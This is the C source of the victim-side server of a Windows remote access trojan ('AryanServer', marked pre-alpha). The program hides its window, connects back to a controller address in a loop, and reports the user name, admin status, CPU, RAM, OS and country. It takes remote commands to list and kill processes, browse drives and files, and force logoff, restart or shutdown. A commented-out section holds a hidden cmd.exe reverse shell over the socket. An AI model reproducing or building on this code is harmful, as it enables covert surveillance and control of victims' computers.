#include <winsock.h>
#include <windows.h>
#include <stdio.h>
#include <commctrl.h>
#include <Tlhelp32.h>
#include "tiny.h"
#include "resource.h"
#include "AryanServer.h"


#define	RATMSG_SOCKET	WM_USER+1
#define PORT			1000
#define BUFF_SIZE		1024
#define	COMMAND_INTERPRETER		"cmd.exe"	



char IP [20] = "127.0.0.1";
BOOL			IsHiddenAlready=0;
SOCKADDR_IN		RemAdr;
WORD			Event;
bool			WaitForPacket=0;
char			*RecvBuf;
char			OutBuf[1024];
//HWND			Ghwnd;
bool            Connect = 0;
DWORD			thread;
int				LocalId = 0;
////////////////////////////////////////////////////////////////////////////
PACKETHEAD		Head;
DWORD			HeadSize=sizeof(PACKETHEAD);
//Shell Handles
DWORD dwErr, dwRet;
HANDLE hOutputRd, hOutputWr, hInputRd, hInputWr;
PROCESS_INFORMATION pi={0};
TCHAR szBuffer[BUFF_SIZE];
TCHAR zBuffer[BUFF_SIZE];
DWORD nBytesAvail, nBytesWritten;

SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES)};
STARTUPINFO si={0};

//char IP[20] = "127.0.0.1";
char Buffer [1024];
char TotalRam [1024];
char ServerVersion [100] = "Pre-Alpha";
SOCKET client, server;
WSADATA wsadata;
////////////////////////////////////////////////////////////////////////////
//Screen Res
int y = 0;
int x = 0;
int d = 0;
char ResultRes [100] = "";
int  WaitForData = 0;
////////////////////////////////////////////////////////////////////////////
//system info functions
char Country[80];
typedef void (WINAPI *PGNSI)(LPSYSTEM_INFO);
////////////////////////////////////////////////////////////////////////////
HANDLE hReadPipe1,hWritePipe1,hReadPipe2,hWritePipe2;  
unsigned long lBytesRead; 

////////////////////////////////////////////////////////////////////////////
//Screen Res
void ScreenRes()
{
   //width
   int x = GetSystemMetrics(SM_CXSCREEN);
   if(x == 0)
   {
    strcpy(ResultRes, "X Failed!");
   }
   // height
    y = GetSystemMetrics(SM_CYSCREEN);
    if(y == 0)
   {
	strcpy(ResultRes, "Y Failed!");
   }

ZeroMemory(&ResultRes[0],100);
sprintf(&ResultRes[0],"%d x %d", x, y);
strcpy(Head.Buf, ResultRes);
}
//////////////////////////////////////////////////////////////////////////////
//OS version (win DOS or NT based)
bool GetOSVersion()
{
PGNSI pGNSI;
bool bOsVersionInfoEx;
bool ntOS;

OSVERSIONINFOEX osvi; SYSTEM_INFO si;
ZeroMemory(&si, sizeof(SYSTEM_INFO));
ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));

osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

if(!(bOsVersionInfoEx = GetVersionEx ((OSVERSIONINFO *) &osvi)))
{
osvi.dwOSVersionInfoSize = sizeof (OSVERSIONINFO);
if (!GetVersionEx( (OSVERSIONINFO *) &osvi) )
return false;
}

// Call GetNativeSystemInfo if supported or GetSystemInfo otherwise.
pGNSI = (PGNSI) GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "GetNativeSystemInfo");

if(pGNSI != NULL)
pGNSI(&si);
else
GetSystemInfo(&si);

switch(osvi.dwPlatformId)
{ // Test for the Windows NT or 9x product family.
case VER_PLATFORM_WIN32_NT:
{
if(osvi.dwMajorVersion == 5 || osvi.dwMajorVersion == 6) // winXP or Vista
ntOS = true;
break;
}

case VER_PLATFORM_WIN32_WINDOWS:
{
if(osvi.dwMajorVersion == 4) // win9x or WinME
ntOS = false;
break;
}
break;
}
return ntOS;
}
void GetTotalRAM()
{
	MEMORYSTATUS Status;
	ZeroMemory(&Status, sizeof(Status));
	Status.dwLength = sizeof(Status);
	GlobalMemoryStatus(&Status);
	DWORD dwRAM = (DWORD)(Status.dwTotalPhys / (1024*1024));
	strcpy(Buffer, "");
	wsprintf(Buffer, "%d MB", dwRAM);
	strcpy(Head.Data, Buffer);
	ZeroMemory(Buffer, 64);
}

void Key(char *loc, char *regkey, char *name)
{
     HKEY key;
     char Serial[25] = "", Sentence[256] = "", final[256] = "";
     DWORD len = sizeof(Serial);
              if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, loc, 0, KEY_QUERY_VALUE, &key) == ERROR_SUCCESS) {
              RegQueryValueEx(key, regkey, NULL, NULL, (BYTE *) Serial, &len );
              strcpy(final, "");
              strcat(final, Serial);
              send(client,final,100,0);
               }
     else  {
     send(client, "Not Found", 100, 0); 
     }
}

void GetProcessor()
{
char  CPUkey [100] = "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0";
char  CPUVal [100] = "ProcessorNameString";
char CPU [100] = "";
HKEY key1;
DWORD type = REG_SZ; // type of data were querying, in this case, a string
DWORD dataSize; // to hold our string size of the grabbed data
int result;
char* buf = (char*)malloc(100);

if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,CPUkey,0,KEY_READ, &key1) == ERROR_SUCCESS)
{
RegQueryValueEx(key1,CPUVal, NULL, NULL, NULL, &dataSize);
realloc(buf, dataSize);

result = RegQueryValueEx(key1,CPUVal, NULL, NULL, (PBYTE)buf, &dataSize);
if(result == ERROR_SUCCESS)
{
strcpy(Head.Buf3, buf);
}
}

RegCloseKey(key1);
Sleep(1000);
}



bool GetCompInfo(bool ntOS)
{
// holds win9x and XP info paths
const char *szKey9x = "Software\\Microsoft\\Windows\\CurrentVersion";
const char *szKeyNT = "Software\\Microsoft\\Windows NT\\CurrentVersion";

// holds query paths
char keyNtName[6][100] = { "ProductName","CSDVersion"};
char key9xname[7][100] = { "VersionNumber","ProductName"};

// used to hold grabbed data
char* buf = (char*)malloc(100);
char* buf1= (char*)malloc(100);
HKEY key1;
DWORD type = REG_SZ; // type of data were querying, in this case, a string
DWORD dataSize; // to hold our string size of the grabbed data
int result;

// if were running under win 2k, XP or Vista
if(ntOS == true)
{
if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,szKeyNT,0,KEY_READ, &key1) == ERROR_SUCCESS)
{
for(int i = 0; i < 2; i++) 
{
RegQueryValueEx(key1,keyNtName[i], NULL, NULL, NULL, &dataSize);
realloc(buf, dataSize);

result = RegQueryValueEx(key1,keyNtName[i], NULL, NULL, (PBYTE)buf, &dataSize);
if(result == ERROR_SUCCESS && i == 0)
{
strcpy(Head.Threads, "");
strcpy(Head.Threads, buf);

Sleep(100);
}
else
{
strcpy(buf1,buf);
strcat(Head.Threads, " / ");
strcat(Head.Threads, buf); 
}

}

RegCloseKey(key1);
}
}
else // if were running under win9x or Win ME
{
if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,szKey9x,0,KEY_ALL_ACCESS, &key1) == ERROR_SUCCESS)
{
for(int i = 0; i < 3; i++)
{
RegQueryValueEx(key1,key9xname[i], NULL, NULL, NULL, &dataSize);
realloc(buf, dataSize);

result = RegQueryValueEx(key1,key9xname[i], NULL, NULL, (PBYTE)buf, &dataSize);
if(result == ERROR_SUCCESS)
{
}

}
}
}

// cleanup
if(key1) { RegCloseKey(key1); }
if(buf) { free(buf); buf = NULL; }
return true;
}

void GetUserInfo()
{
char ret[100];

char host[100];
gethostname(host, sizeof(host));

char UserName[100];
DWORD nUserName = sizeof(UserName);
GetUserName(UserName, &nUserName);

wsprintf(ret," %s",UserName);
strcpy(Head.PID, ret);
}

void Getcountry()
{
    GetLocaleInfo(LOCALE_SYSTEM_DEFAULT,LOCALE_SENGCOUNTRY,Country,128);
    strcpy(Head.PRIORITY, Country);    
}
void serverVersion()
{
strcpy(Head.ParentPID, ServerVersion);
}

BOOL IsAdmin()
{
UINT i;
bool bRetval = FALSE;
BOOL bSuccess;
HANDLE hAccessToken;
UCHAR InfoBuffer[1024];
PTOKEN_GROUPS ptgGroups = (PTOKEN_GROUPS) InfoBuffer;
DWORD dwInfoBufferSize;
PSID psidAdministrators;
SID_IDENTIFIER_AUTHORITY siaNtAuthority = SECURITY_NT_AUTHORITY;
OSVERSIONINFO Info = {0};
Info.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
if (GetVersionEx(&Info)) {
if ((Info.dwPlatformId==VER_PLATFORM_WIN32_WINDOWS)&&
(Info.dwMajorVersion==4))
return TRUE;
}
else return FALSE;
if (!OpenThreadToken(GetCurrentThread(),TOKEN_QUERY,TRUE,&hAccessToken)) {
if (GetLastError() != ERROR_NO_TOKEN)
return FALSE;
if (!OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&hAccessToken))
return FALSE;
}
bSuccess = GetTokenInformation(hAccessToken,TokenGroups,InfoBuffer,
sizeof(InfoBuffer),&dwInfoBufferSize);
CloseHandle(hAccessToken);
if (!bSuccess)
return FALSE;
if (!AllocateAndInitializeSid(&siaNtAuthority,2,SECURITY_BUILTIN_DOMAIN_RID,
DOMAIN_ALIAS_RID_ADMINS,0,0,0,0,0,0,&psidAdministrators))
return FALSE;
for (i = 0; i < ptgGroups->GroupCount; i++) {
if (EqualSid(psidAdministrators,ptgGroups->Groups[i].Sid)) {
bRetval = TRUE;
break;
}
}
FreeSid(psidAdministrators);
return bRetval;
}
 
int Admin()
{
char ADMIN [100] = "";
if (IsAdmin())
{
strcpy(Head.Buf2, "Administrator");
} 
else
{
 strcpy(Head.Buf2, "Not Administrator");
}

return 0;
}

void systeminfo()
{
ScreenRes();
Admin();
GetProcessor();
GetTotalRAM();
serverVersion();
GetUserInfo();
Getcountry();
bool isNT = GetOSVersion();
GetCompInfo(isNT);
Head.PacketType = PACKET_USER_JOINED;
send(client,(char *)&Head, sizeof(Head), 0);
}
///////////////////////////////////////////////////////////////////////////
//Create Socket.
void InitWSA()
{
	WORD	wVersionRequested;
	WSADATA wsaData;
	int		err;
	wVersionRequested = MAKEWORD( 2, 0 );
    err = WSAStartup( wVersionRequested, &wsaData );
    if ( err != 0 )
		PostQuitMessage(1);

    if ( LOBYTE( wsaData.wVersion ) != 2 ||
		 HIBYTE( wsaData.wVersion ) != 0 )
	{
	    WSACleanup();
		PostQuitMessage(0);
	}
}

void CloseSocket()
{
	closesocket(client);
	WSACleanup();
}
void FreeResources(HANDLE hRead, HANDLE hWrite, PROCESS_INFORMATION *pi)
{
	CloseHandle(hRead);
	CloseHandle(hWrite);
	TerminateProcess(pi->hProcess, 0);
	WSACleanup();
}

//////////////////////////////////////////////////////////////////////////////////////////////
//Task manager Functions.
BOOL KillProcess(char *Process)
{
     int result;
     HANDLE hProcessSnap = 0;
	 HANDLE hProcess = 0;
	 HANDLE hSnapshot = 0;
	 PROCESSENTRY32 pe32;
     hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     
     pe32.dwSize = sizeof(PROCESSENTRY32);
         
     Process32First(hProcessSnap, &pe32);
         
     while(Process32Next(hProcessSnap, &pe32))
     {
        if(!strcmp(pe32.szExeFile, Process))
        {
           result = 1;
                                   
           hProcess = OpenProcess(PROCESS_TERMINATE, 0, pe32.th32ProcessID);
           
           if(TerminateProcess(hProcess, 0) == 0)
           {
              MessageBox(NULL, "Terminating process failed !", "KillProcess", MB_OK | MB_ICONERROR);
           }
           
           else
           {
            
           }
        }
     }
         
     CloseHandle(hProcess);
     CloseHandle(hProcessSnap);
     
     if(result == 0)
     MessageBox(NULL, "Process cannot be found !", "KillProcess", MB_OK | MB_ICONWARNING);
     
     result = 0;
	return TRUE;
}      

int SendTask()
{
	int Priority = 0;
    HANDLE Snap;
    PROCESSENTRY32 proc32;

Snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);//take a snap of all processes
  
  if(Snap==INVALID_HANDLE_VALUE)
  {
    return EXIT_FAILURE;
  }
  
  proc32.dwSize=sizeof(PROCESSENTRY32); //set size of structure
  
  while((Process32Next(Snap,&proc32))==TRUE)//while we haven't reached the final process
  {
     strcpy(Head.Data, proc32.szExeFile);
	  
	 ZeroMemory(&Head.PID[0],10);
     sprintf(&Head.PID[0],"%d",proc32.th32ProcessID);

	 ZeroMemory(&Head.Threads[0],10);
     sprintf(&Head.Threads[0],"%d",proc32.cntThreads);
	 
     ZeroMemory(&Head.ParentPID[0],10);
     sprintf(&Head.ParentPID[0],"%d",proc32.th32ParentProcessID);
	 
	 Priority = proc32.pcPriClassBase;

	 if(Priority > 7 && Priority < 12)
	 {
		strcpy(Head.PRIORITY, "Normal");
	 }
	 if(Priority < 7)
	 {
		strcpy(Head.PRIORITY, "Low");
	 }
	 if(Priority > 12)
	 {
		strcpy(Head.PRIORITY, "High");
	 }
    Head.PacketType=PACKET_TASK_MANAGER;
	Head.ID = LocalId;
	send(client,(char*)&Head,HeadSize,0);
	Sleep(5);
  }
  return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////
//Shell Functions
/*void FreeResources(HANDLE hRead, HANDLE hWrite, PROCESS_INFORMATION *pi)
{
	CloseHandle(hRead);
	CloseHandle(hWrite);
	TerminateProcess(pi->hProcess, 0);
	WSACleanup();
}


int ShellSetup(void) 
{

	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	if(!CreatePipe(&hOutputRd, &hOutputWr, &sa, NULL))
	{
		dwErr = GetLastError();
		MessageBox(NULL, "Error Creating Pipes", "Error", MB_OK | MB_ICONERROR);
		return -1;
	}

	if(!CreatePipe(&hInputRd, &hInputWr, &sa, NULL))
	{
		dwErr = GetLastError();
		printf("ERROR: Pipe creation failed! (Code %d)\n", dwErr);
		return -1;
	}

	GetStartupInfo(&si);
	si.hStdError = hOutputWr;
	si.hStdOutput = hOutputWr;
	si.hStdInput = hInputRd;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;

	if(!CreateProcess(NULL, TEXT(COMMAND_INTERPRETER), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
	{
		dwErr = GetLastError();
		printf("ERROR: Process creation failed! (Code %d)\n", dwErr);
		return -1;
	}

	CloseHandle(hOutputWr);
	CloseHandle(hInputRd);

 for(;;)
	{
		do 
		{
			dwRet = sendBuffer(hOutputRd, hSock);
			if(dwRet == -1)
			{
				FreeResources(hOutputRd, hInputWr, &pi);
				break;
			}

		} while (dwRet != FALSE);
		dwRet = recvBuffer(hInputWr, hSock);
		if(dwRet == -1)
		{
			FreeResources(hOutputRd, hInputWr, &pi);
			break;
		}
	}

	printf("Connection closed, exiting...\n");

	return 0;
}

int sendBuffer(HANDLE hPipe, SOCKET hSock) 
{
	TCHAR szBuffer[BUFF_SIZE];
	DWORD nBytesAvail;

	if(!PeekNamedPipe(hPipe, NULL, BUFF_SIZE, &nBytesAvail, 0, 0) || nBytesAvail == 0)
		return FALSE;

	if(!ReadFile(hPipe, szBuffer, nBytesAvail, &nBytesAvail, 0))
		return -1;

	if(send(hSock, szBuffer, nBytesAvail, 0) == SOCKET_ERROR)
		return FALSE;
	Sleep(50);

	return TRUE;
}

int recvBuffer(HANDLE hPipe, SOCKET hSock)
{
	TCHAR szBuffer[BUFF_SIZE];
	DWORD nBytesAvail, nBytesWritten;

	nBytesAvail = recv(hSock, szBuffer, BUFF_SIZE, 0);
	printf (szBuffer);
	if(nBytesAvail == SOCKET_ERROR)
		return FALSE;

	if(nBytesAvail == 0)
		return -1;

	if(!WriteFile(hPipe, szBuffer, nBytesAvail, &nBytesWritten, NULL))
		return FALSE;

	Sleep(50);

	return TRUE;
}


}*/

int ListDir(char dir[256]) 
{
   WIN32_FIND_DATA ffd;
   LARGE_INTEGER filesize;
   TCHAR szDir[MAX_PATH];
   HANDLE hFind = INVALID_HANDLE_VALUE;
   DWORD dwError=0;
	char FileExtention [10] = "";;
	int C = 0;
	int H = 0;
   strcpy(szDir, dir);
   strcat(szDir, "*");
 

    hFind = FindFirstFile(szDir, &ffd);
	if(hFind == NULL)
	{
	
	}
   
   if (INVALID_HANDLE_VALUE == hFind) 
   {
	 MessageBox(NULL, "Invalid Handle (hFind)", "List Find Next File", MB_OK);
     return 1;
   } 
   
   // List all the files in the directory with some info about them.

   do
   {
      if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
      {
		 strcpy(Head.Data,ffd.cFileName); 
		 Head.PacketType = PACKET_FILE_MANAGER_FILE;
		 Head.ID = LocalId;
		 Head.ID2 = 2;
		 Head.ID3 = 8;
         send(client,(char*)&Head,HeadSize,0);
		 Sleep(1);

      }
      else
      {
		  
         filesize.LowPart = ffd.nFileSizeLow;
         filesize.HighPart = ffd.nFileSizeHigh;
		 C = 0;
		 H = 0;
		 Head.ID3 = 0;
		 strcpy(Head.Data, ffd.cFileName);

         ZeroMemory(&Head.ParentPID[0],20);
         sprintf(&Head.ParentPID[0],"%d Bytes",filesize.QuadPart);
         while(Head.Data[C] != '.')
		 {
		 C++;
		 }
		 while(Head.Data[C] != NULL)
		 {
		 FileExtention[H] += Head.Data[C];
		 H++;
		 C++;
		 }
		 if(strstr(FileExtention, ".exe") || strstr(FileExtention, ".EXE") || strstr(FileExtention, ".com") || strstr(FileExtention, ".COM"))
		 {
		 Head.ID3 = 10;
		 goto send;
		 }
		 if(strstr(FileExtention, ".jpg"))
		 {
		 Head.ID3 = 13;
		 goto send;
		 }
		 if(strstr(FileExtention, ".PNG") || strstr(FileExtention, ".png") )
		 {
		 Head.ID3 = 13;
		 goto send;
		 }
		 if(strstr(FileExtention, ".jpeg") || strstr(FileExtention, ".JPEG"))
		 {
		  Head.ID3 = 13;
		  goto send;
		 }
		 if(strstr(FileExtention, ".ico") || strstr(FileExtention, ".ICO"))
		 {
		  Head.ID3 = 13;
		  goto send;
		 }
		 if(strstr(FileExtention, ".BMP") || strstr(FileExtention, ".bmp"))
		 {
		 Head.ID3 = 13;
		 goto send;
		 }
		 if(strstr(FileExtention, ".GIF") || strstr(FileExtention, ".gif"))
		 {
		 Head.ID3 = 13;
		 goto send;
		 }
		 if(strstr(FileExtention, ".pif") || strstr(FileExtention, ".pif"))
		 {
		 Head.ID3 = 13;
		 goto send;
		 }
		 if(strstr(FileExtention, ".txt") || strstr(FileExtention, ".doc") || strstr(FileExtention, ".DOC") || strstr(FileExtention, ".TXT") || strstr(FileExtention, ".log") || strstr(FileExtention, ".LOG"))
		 {
		  Head.ID3 = 14;
		  goto send;
		 }
		 if(strstr(FileExtention, ".mp3") || strstr(FileExtention, ".MP3") || strstr(FileExtention, ".mp4") || strstr(FileExtention, ".MP4"))
		 {
		  Head.ID3 = 12;
		  goto send;
		 }
		 if(strstr(FileExtention, ".AVI") || strstr(FileExtention, ".avi") || strstr(FileExtention, ".mpg") || strstr(FileExtention, ".mpeg") || strstr(FileExtention, ".MPEG") || strstr(FileExtention, ".wmv") || strstr(FileExtention, ".WMV"))
		 {
		 Head.ID3 = 15;
		 goto send;
		 }
		if(strstr(FileExtention, ".rar") || strstr(FileExtention, ".RAR") || strstr(FileExtention, ".zip") || strstr(FileExtention, ".ZIP"))
		{
		Head.ID3 = 11;
		goto send;
		}
		 else
		 {
		 Head.ID3 = 9;
		 goto send;
		 }
send:
		 ZeroMemory(&FileExtention[0],10); 
		 Head.PacketType = PACKET_FILE_MANAGER_FILE;
		 Head.ID2 = 1;
		 send(client, (char*)&Head, sizeof(Head), 0);
		 ZeroMemory(&Head.Data[0], 1024);
		 /*		 
		 ZeroMemory(&Head.PID,20);
         sprintf(&Head.PID[0],"%d",ffd.ftCreationTime);
		 MessageBox(NULL, Head.PID, "Creationtime", MB_OK);

		 ZeroMemory(&Head.PRIORITY,20);
         strcpy(&Head.PRIORITY[0], ffd.ftLastAccessTime);
		 MessageBox(NULL, Head.PRIORITY, "AccessTime", MB_OK);

		 ZeroMemory(&Head.Threads,20);
         sprintf(&Head.Threads,"%s",ffd.ftLastWriteTime);
		 MessageBox(NULL, Head.Threads, "WriteTime", MB_OK);*/
		 Sleep(1);
	 }

   }while (FindNextFile(hFind, &ffd) != 0);
 
   dwError = GetLastError();
   if (dwError != ERROR_NO_MORE_FILES) 
   {
	   Sleep(100);
   }

   FindClose(hFind);
   return 0;
}


void SendDrives()
{
UINT driveType;
char drive[4] = "A:\\";
char finaldrive [20];

for(drive[0] = 'A'; drive[0] <= 'Z'; drive[0]++) 
{
switch(GetDriveType(drive)) 
{
case DRIVE_REMOVABLE: // The drive has removable media
Head.ID2 = 2;
strcpy(Head.Data, drive);
Head.PacketType = PACKET_FILE_MANAGER_DRIVE;
Head.ID = LocalId;
send(client,(char*)&Head,HeadSize,0);
break;

case DRIVE_REMOTE: // The drive is a remote (network) drive.
Head.ID2 = 4;
strcpy(Head.Data, drive);
Head.PacketType = PACKET_FILE_MANAGER_DRIVE;
Head.ID = LocalId;
send(client,(char*)&Head,HeadSize,0);
break;

case DRIVE_UNKNOWN: // The drive type cannot be determined.
strcpy(Head.Data, drive);
Head.PacketType = PACKET_FILE_MANAGER_DRIVE;
Head.ID = LocalId;
send(client,(char*)&Head,HeadSize,0);
break;

case DRIVE_FIXED: // The drive has fixed media
Head.ID2 = 1;
strcpy(Head.Data, drive);
Head.PacketType = PACKET_FILE_MANAGER_DRIVE;
Head.ID = LocalId;
send(client,(char*)&Head,HeadSize,0);
break;

case DRIVE_CDROM: // The drive is a CD-ROM drive.
Head.ID2 = 3;
strcpy(Head.Data, drive);
Head.PacketType = PACKET_FILE_MANAGER_DRIVE;
Head.ID = LocalId;
send(client,(char*)&Head,HeadSize,0);
break;

case DRIVE_RAMDISK: // The drive is a RAM disk.
Head.ID2 = 5;
strcpy(Head.Data, drive);
Head.PacketType = PACKET_FILE_MANAGER_DRIVE;
Head.ID = LocalId;
send(client,(char*)&Head,HeadSize,0);
break;

default:
break;
}
}
return;
}
LRESULT CALLBACK MainWndProc(HWND hwnd,UINT Mes,WPARAM wParam,LPARAM lParam)
{
int ConRes;
bool Busy = 0;
char Buffer [1024] = "";

	switch(Mes)
	{
	case WM_INITDIALOG:  
		ShowWindow(hwnd,SW_HIDE);
		if(!Connect)
		{
		Connect = 1;
		InitWSA();
        begin:
		RemAdr.sin_family = AF_INET;
		RemAdr.sin_addr.s_addr=inet_addr(IP);
		RemAdr.sin_port = htons (PORT);
		client = socket (AF_INET,SOCK_STREAM,0);
	    ConRes=connect (client, (struct sockaddr *)&RemAdr,sizeof(RemAdr));
			if (ConRes==-1)
			{
			 goto begin;
			}
			else
			{
			systeminfo();
			}
			WSAAsyncSelect(client,hwnd,RATMSG_SOCKET,FD_READ|FD_CLOSE|FD_CONNECT);
		}
		else
		{
		break;
		}
		break;

		case WM_PAINT: 
		if (!IsHiddenAlready)
		{
			ShowWindow(hwnd,SW_HIDE);
			IsHiddenAlready^=1;
		}
		break;
	case RATMSG_SOCKET:
		Event=WSAGETSELECTEVENT(lParam);
		switch(Event)
		{
		case FD_CONNECT:
			MessageBox(NULL, "Connection", "Connected", MB_OK);
			break;
		case FD_CLOSE:
			MessageBox(NULL, "Closing...", "CLOSING TIME", MB_OK);
			WSACleanup();
				ExitProcess(0);
			    EndDialog(hwnd, Event);
		    	PostQuitMessage(0);
			closesocket(client);
			break;
		case FD_READ:
         nBytesAvail=recv(client,(char*)&Head,HeadSize,0);    
		 switch (Head.PacketType)
			{
				case PACKET_REMOTE_SHELL:
					LocalId = Head.ID;
					if(d == 0)
					{
					//CreateCmd();
					break;
					}
				//	RunCmd(Head.Data);
				break;

				case PACKET_TASK_MANAGER:
					LocalId = Head.ID;
					SendTask();
					break;
				case PACKET_TASK_MANAGER_KILL:
					LocalId = Head.ID;
					KillProcess(Head.Data);
					break;
				case PACKET_FILE_MANAGER_DRIVE:
					LocalId = Head.ID;
					SendDrives();
					break;
				case PACKET_FILE_MANAGER_FILE_FOLDER:
					ListDir(Head.Data);
					break;
				//case PACKET_FILE_MANAGER_NEW_FOLDER:
				case PACKET_COMPUTER_LOGOFF:
					ExitWindowsEx(EWX_LOGOFF, 0);
					break;
				case PACKET_COMPUTER_RESTART:
					InitiateSystemShutdown(NULL,NULL, 0,TRUE,TRUE);
					break;
				case PACKET_COMPUTER_SHUTDOWN:
					ExitWindowsEx(EWX_SHUTDOWN | EWX_POWEROFF, EWX_FORCE);
					break;
			}

	
		  
		}

		break;
	}
return 0;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev,
				   LPSTR lpszParam, int nCmdShow)
{
	DialogBox(hInst,"MAIN",0,(DLGPROC)MainWndProc);
	return 0;
}